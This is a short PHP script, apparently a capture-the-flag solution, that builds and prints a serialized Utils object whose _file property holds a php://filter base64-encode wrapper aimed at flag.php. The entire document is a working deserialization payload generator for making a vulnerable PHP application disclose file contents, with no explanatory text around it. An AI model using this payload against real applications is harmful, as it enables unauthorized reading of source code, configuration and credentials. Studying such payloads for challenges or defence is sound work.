<?php
class Utils
{
  public $_file;
  public $_id;
  public $_host;
  public $_result;
}
$user = new Utils;
$user->_file = "php://filter/convert.base64-encode/resource=flag.php";
echo serialize($user);
?>